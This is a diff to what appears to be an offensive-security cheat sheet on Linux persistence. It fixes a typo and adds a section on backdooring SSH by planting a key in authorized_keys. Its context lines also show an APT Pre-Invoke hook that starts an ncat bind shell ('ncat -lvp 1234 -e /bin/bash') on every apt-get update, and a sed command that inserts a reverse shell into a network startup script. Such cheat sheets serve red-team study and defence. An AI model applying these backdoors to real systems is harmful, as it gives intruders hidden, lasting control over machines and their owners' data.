@@ -50,7 +50,7 @@ sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
 
 ## Backdooring an user startup file
 
-Linux, write a file in  `~/.config/autostart/NOM_OF_FILE.desktop`
+Linux, write a file in  `~/.config/autostart/NAME_OF_FILE.desktop`
 
 ```powershell
 In : ~/.config/autostart/*.desktop
@@ -78,6 +78,14 @@ Next time "apt-get update" is done, your CMD will be executed!
 ```bash
 echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
 ```
+
+## Backdooring the SSH
+
+Add an ssh key into the `~/.ssh` folder.
+
+1. `ssh-keygen`
+2. write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys`
+3. set the right permission, 700 for ~/.ssh and 600 for authorized_keys
 
 ## Tips
 
